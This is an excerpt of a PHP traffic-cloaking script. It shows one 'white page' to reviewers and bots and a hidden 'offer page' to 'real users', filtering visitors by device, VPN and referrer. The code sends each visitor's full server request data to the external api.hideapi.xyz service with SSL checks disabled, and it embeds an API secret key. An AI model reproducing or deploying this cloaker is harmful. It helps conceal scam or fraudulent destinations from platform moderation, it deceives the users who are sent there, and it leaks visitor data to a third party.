...
$CLOAKING['OFFER_PAGE'] = 'https://charlesmiller538.github.io/andrews/';//PHP/HTML file or URL offer used for real users
...
$CLOAKING['API_SECRET_KEY'] = 'v19446ef2e51d34378842c8923d583a787';
/*********************************************/
// DO NOT EDIT ANYTHING BELOW !!!
if(!empty($CLOAKING['VERSION']) || !empty($GLOBALS['CLOAKING']['VERSION'])) die('Recursion Error');

$CLOAKING['VERSION']=20220715;
...
if($CLOAKING['ALLOW_VPN'] !== 'true' && $CLOAKING['ALLOW_VPN'] !== true) $CLOAKING['ALLOW_VPN'] = '';
if($CLOAKING['UTM'] !== 'true' && $CLOAKING['UTM'] !== true) $CLOAKING['UTM'] = '';
if($CLOAKING['NO_REF'] !== 'true' && $CLOAKING['NO_REF'] !== true) $CLOAKING['NO_REF'] = '';
if($CLOAKING['BLOCK_APPLE'] !== 'true' && $CLOAKING['BLOCK_APPLE'] !== true) $CLOAKING['BLOCK_APPLE'] = '';
if($CLOAKING['BLOCK_ANDROID'] !== 'true' && $CLOAKING['BLOCK_ANDROID'] !== true) $CLOAKING['BLOCK_ANDROID'] = '';
if($CLOAKING['BLOCK_WIN'] !== 'true' && $CLOAKING['BLOCK_WIN'] !== true) $CLOAKING['BLOCK_WIN'] = '';
if($CLOAKING['BLOCK_MOBILE'] !== 'true' && $CLOAKING['BLOCK_MOBILE'] !== true) $CLOAKING['BLOCK_MOBILE'] = '';
if($CLOAKING['BLOCK_DESCTOP'] !== 'true' && $CLOAKING['BLOCK_DESCTOP'] !== true) $CLOAKING['BLOCK_DESCTOP'] = '';
...
if(!empty($_REQUEST['cloaking']) && ($CLOAKING['STEALTH']=='off' || $CLOAKING['DEBUG_MODE'] == 'on' || (!empty($_REQUEST['key']) && $_REQUEST['key']==$CLOAKING['API_SECRET_KEY'])) ) {
    ...
    if ($_REQUEST['cloaking'] == 'white') cloakedWhitePage($CLOAKING['WHITE_PAGE'],$CLOAKING['WHITE_METHOD']);
    ...
    $CLOAKINGdata=json_encode($_SERVER);//$_ENV;
    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=9249141281031f1666896896&version='.$CLOAKING['VERSION'].'&curl=false&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'] , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=9249141281031f1666896896&version='.$CLOAKING['VERSION'].'&curl=true&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'], $CLOAKINGdata);

    if(empty($CLOAKING['STATUS'])){
        echo '❌ PHP configuration error. Contact your hosting support and ask them to enable CURL in PHP.<br>';
        $error=1;
    }
    elseif(empty(json_decode($CLOAKING['STATUS'], true))) {
//        echo '❌ Network error. Your hosting provider might be using some kind of firewall or resource limiter that will result in excessive traffic loss. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
        echo '❌ Error: corrupted data. Contact us if you have any questions.<br><br><code>'.$CLOAKING['STATUS'].'</code><br>';
        $error=1;
    }
    else {
        ...
        else if((empty($CLOAKING['STATUS']['action']) && empty($CLOAKING['STATUS']['error']))) {
            echo '❌ Error: non valid json. Contact us if you have any questions.<br><br><code>'.json_encode($CLOAKING['STATUS']).'</code><br>';
            $error=1;
        }
        else if(!empty($CLOAKING['STATUS']['error'])) {
            if ($CLOAKING['STATUS']['error']=='Unauthorized') {
                echo '❌ Your secret API key has expired or blocked due terms violation. Contact support to extend the service!<br>';
            }
            else {
                echo '❌ '.$CLOAKING['STATUS']['error'].'!<br>';
            }
            $error=1;
        }
    }
...
// allow only html content serving
if(empty($CLOAKING['HTACCESS_FIX']) && preg_match('#\.(xml|txt|pdf|asp|aspx|cfm|gz|webp|cgi|jsp|rar|rss|tar|sql|yml|mp4|bz2|7z|gzip|zip|json|mp3|jpg|jpeg|png|css|gif|svg|ttf|woff|woff2|webm|ico|js|eot|apk|ashx|exe|tz|doc|docx|lzma|bzip2|tgz|feed|map|ini|dat|jar|xls|xlsx|msi)$#i',$_SERVER["REQUEST_URI"])) {
